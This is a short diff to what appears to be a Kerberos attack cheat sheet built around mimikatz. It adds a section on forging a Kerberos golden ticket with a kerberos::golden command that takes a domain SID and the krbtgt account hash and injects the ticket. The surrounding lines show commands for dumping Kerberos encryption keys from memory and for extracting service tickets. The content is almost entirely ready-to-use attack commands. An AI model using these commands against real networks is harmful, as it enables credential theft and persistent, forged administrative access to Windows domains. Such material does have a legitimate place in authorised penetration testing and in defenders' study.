@@ -45,6 +45,11 @@ Keys are not the same as tickets, they are encryption keys that Kerberos uses fo
 C:\> mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
 ```
 
+### Create a Golden Ticket
+``` PowerShell
+kerberos::golden /user:[user] /domain:[domain] /sid:[domain-sid] /krbtgt:[krbtgt-acc-nthash] /sids:[additional-sids] /ptt
+```
+
 ### Extracting Kerberos TGS Tickets
 ```batch
 C:\> mimikatz.exe privilege::debug
